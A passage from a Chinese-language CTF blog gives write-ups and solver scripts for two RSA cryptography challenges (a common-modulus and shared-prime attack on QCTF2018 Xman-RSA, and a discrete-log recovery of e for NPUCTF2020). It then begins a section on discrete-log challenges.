class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="QCTF2018-Xman-RSA"><a href="#QCTF2018-Xman-RSA" class="headerlink" title="[QCTF2018]Xman-RSA"></a>[QCTF2018]Xman-RSA</h4><p>纳尼，没给出加密脚本？哦，原来是加密脚本也加密了。。。</p>
<p>看起来第一步是进行词频分析呀，这么大的内容</p>
<p><img src="/2021/05/28/CTF/image-20210729211301798.png" alt></p>
<p>把第一个再拿出来改一改就行了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> is_prime
<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
<span class="token keyword">import</span> base64


<span class="token keyword">def</span> <span class="token function">bytes_to_num</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">num_to_bytes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    b <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> b <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">else</span> b
    <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_a_prime</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    random_seed <span class="token operator">=</span> urandom<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
    num <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>random_seed<span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> is_prime<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    num <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> num


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> num_to_bytes<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>
    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>
    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>


f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
msg1 <span class="token operator">=</span> <span class="token string">""</span>
msg2 <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        msg2 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        msg1 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
p1 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
p2 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
p3 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
n1 <span class="token operator">=</span> p1 <span class="token operator">*</span> p2
n2 <span class="token operator">=</span> p1 <span class="token operator">*</span> p3
e <span class="token operator">=</span> <span class="token number">0x1001</span>
c1 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>
c2 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span>
e1 <span class="token operator">=</span> <span class="token number">0x1001</span>
e2 <span class="token operator">=</span> <span class="token number">0x101</span>
p4 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
p5 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
n3 <span class="token operator">=</span> p4 <span class="token operator">*</span> p5
c1 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
c2 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后就是分析了，脚本很简单，先共模攻击获得n1，然后n2也可以有了，然后有msg1、msg2，然后根据他的分离的判定条件将两部分msg合并一下就行了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long

<span class="token triple-quoted-string string">"""
def bytes_to_num(b):
    return int(b.encode('hex'), 16)


def num_to_bytes(n):
    b = hex(n)[2:-1]
    b = '0' + b if len(b) % 2 == 1 else b
    return b.decode('hex')


def get_a_prime(l):
    random_seed = urandom(l)
    num = bytes_to_num(random_seed)
    while True:
        if is_prime(num):
            break
    num += 1
    return num


def encrypt(s, e, n):
    p = bytes_to_num(s)
    p = pow(p, e, n)
    return num_to_bytes(p).encode('hex')


def separate(n):
    p = n % 4
    t = (p * p) % 4
    return t == 1


f = open('flag.txt', 'r')
flag = f.read()
msg1 = ""
msg2 = ""
for i in range(len(flag)):
    if separate(i):
        msg2 += flag[i]
    else:
        msg1 += flag[i]
p1 = get_a_prime(128)
p2 = get_a_prime(128)
p3 = get_a_prime(128)
n1 = p1 * p2
n2 = p1 * p3
e = 0x1001
c1 = encrypt(msg1, e, n1)
c2 = encrypt(msg2, e, n2)
print(c1)
print(c2)

# 下面的对n1加密，使用相同的n3，不同的e，可以使用共模攻击来打。
e1 = 0x1001
e2 = 0x101
p4 = get_a_prime(128)
p5 = get_a_prime(128)
n3 = p4 * p5
c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')
c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')
print(c1)
print(c2)
print(base64.b64encode(num_to_bytes(n2)))
print(base64.b64encode(num_to_bytes(n3)))
"""</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n2&amp;n3'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    n2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n3 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n1.encrypted'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">0x1001</span>
e1 <span class="token operator">=</span> <span class="token number">0x1001</span>
e2 <span class="token operator">=</span> <span class="token number">0x101</span>
n <span class="token operator">=</span> n3


<span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>
        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>
        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q


<span class="token keyword">def</span> <span class="token function">same_mod</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>
    n1 <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n  <span class="token comment"># powmod进行大数运算</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n1 ='</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span>
    <span class="token keyword">return</span> n1


n1 <span class="token operator">=</span> same_mod<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n2 ='</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>

p1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
p2 <span class="token operator">=</span> n1 <span class="token operator">//</span> p1
p3 <span class="token operator">=</span> n2 <span class="token operator">//</span> p1
phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p3<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>
d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi2<span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ciphertext'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

msg1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>
msg2 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>
    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>
    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>


flag <span class="token operator">=</span> <span class="token string">''</span>
f1 <span class="token operator">=</span> <span class="token number">0</span>
f2 <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> msg2<span class="token punctuation">[</span>f2<span class="token punctuation">]</span>
        f2 <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> msg1<span class="token punctuation">[</span>f1<span class="token punctuation">]</span>
        f1 <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="NPUCTF2020-认清形势，建立信心"><a href="#NPUCTF2020-认清形势，建立信心" class="headerlink" title="[NPUCTF2020]认清形势，建立信心"></a>[NPUCTF2020]认清形势，建立信心</h4><p>给出的题目的脚本为</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> <span class="token comment"># Hidden</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"npuctf&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
169169912654178

128509160179202
518818742414340
358553002064450
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据第二、三、四的内容可以很简单地求得<code>n</code>、<code>e</code>，解题脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> sympy

<span class="token triple-quoted-string string">"""
p = getPrime(25)
e = # Hidden
q = getPrime(25)
n = p * q
m = bytes_to_long(flag.strip(b"npuctf&#123;").strip(b"&#125;"))

c = pow(m, e, n)
print(c)
print(pow(2, e, n))
print(pow(4, e, n))
print(pow(8, e, n))
"""</span>

c <span class="token operator">=</span> <span class="token number">169169912654178</span>
c2 <span class="token operator">=</span> <span class="token number">128509160179202</span>
c4 <span class="token operator">=</span> <span class="token number">518818742414340</span>
c8 <span class="token operator">=</span> <span class="token number">358553002064450</span>

n <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>c2<span class="token operator">*</span>c4 <span class="token operator">-</span> c8<span class="token punctuation">,</span> c2 <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> c4<span class="token punctuation">)</span>
<span class="token comment"># 	1054494004042394&lt;16> = 2 · 18195301 · 28977097</span>

p <span class="token operator">=</span> <span class="token number">28977097</span>
q <span class="token operator">=</span> <span class="token number">18195301</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token number">1</span>
e <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
808723997
b'345y!'
npuctf&#123;345y!&#125;
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>求e可以使用离散对数问题的求解获得。</p>
<h2 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h2><blockquote>
<p>基于离散对数问题的困难问题构造的密码，离散对数问题既是高中时的log问题，幂的逆问题。</p>
</blockquote>
<h3 id="一般离散对数问题"><a href="#一般离散对数问题" class="headerlink" title="一般离散对数问题"></a>一般离散对数问题</h3><h4 id="网鼎杯-2020-青龙组-you-raise-me-up"><a href="#网鼎杯-2020-青龙组-you-raise-me-up" class="headerlink" title="[网鼎杯 2020 青龙组]you_raise_me_up"></a>[网鼎杯 2020 青龙组]you_raise_me_up</h4><p>给出的脚本为</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> random

n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>
m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>
